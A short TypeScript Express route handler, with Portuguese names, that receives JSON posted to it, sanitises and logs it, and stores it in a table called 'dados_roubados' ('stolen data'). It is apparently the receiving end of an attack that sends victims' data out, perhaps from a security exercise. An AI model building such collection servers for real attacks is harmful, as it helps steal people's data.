import { Request, Response } from "express";
import db from "../database";
import xss from "xss";

export const recepcionarDadosRoubados = async (req: Request, res: Response) => {
    try {

        const { dados } = req.body;

        if (!dados) {
            return res.status(400).json({ error: "Dados são obrigatórios" });
        }

        const dadosSanitizados = xss(JSON.stringify(dados));

        console.log(`Recebendo dados roubados: ${dadosSanitizados}`);

        const query = `
            INSERT INTO dados_roubados (dados)
            VALUES ($1)
        `;

        await db.query(query, [dadosSanitizados]);

        res.status(201).json({ message: "Dados recebidos com sucesso" });

    } catch (err: any) {
        console.error("Erro ao registrar dados roubados:", err);
        res.status(500).json({ error: "Erro interno do servidor" });
    }
};